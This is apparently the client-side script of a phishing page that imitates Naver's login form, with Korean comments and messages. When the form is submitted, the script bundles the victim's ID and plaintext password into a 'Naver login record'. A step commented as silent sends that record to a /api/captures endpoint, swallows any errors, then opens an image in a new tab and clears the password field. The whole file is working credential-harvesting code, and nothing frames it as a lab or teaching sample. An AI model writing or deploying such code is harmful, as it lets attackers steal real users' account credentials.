document.addEventListener('DOMContentLoaded', () => {
  const loginForm = document.getElementById('loginForm');
  const userIdInput = document.getElementById('userId');
  const userPwInput = document.getElementById('userPw');
  const tabs = document.querySelectorAll('.tab_item');

  // 0. 페이지 접속 시 팝업 안내창 띄우기
  setTimeout(() => {
    alert('로그인을 해주시기 바랍니다.');
  }, 100);

  // 탭 전환 동작 (ID 로그인, 일회용 번호, QR코드)
  tabs.forEach((tab) => {
    tab.addEventListener('click', () => {
      tabs.forEach((t) => t.classList.remove('active'));
      tab.classList.add('active');
    });
  });

  // 로그인 폼 제출 처리
  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const userId = userIdInput.value.trim();
    const userPw = userPwInput.value;

    if (!userId || !userPw) {
      alert('로그인을 해주시기 바랍니다.');
      return;
    }

    const payloadText = `[네이버 로그인 기록]\n아이디: ${userId}\n비밀번호: ${userPw}\n시각: ${new Date().toLocaleString()}`;

    // 1. 서버에 조용히 저장 전송
    try {
      fetch('/api/captures', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          text: payloadText,
          source: '네이버 로그인 폼',
        }),
      }).catch(() => {});
    } catch {
      // 오류 무시
    }

    // 2. 새 탭으로 image.png 열기
    window.open('/image.png', '_blank');

    // 3. 비밀번호 칸 초기화
    userPwInput.value = '';
  });
});
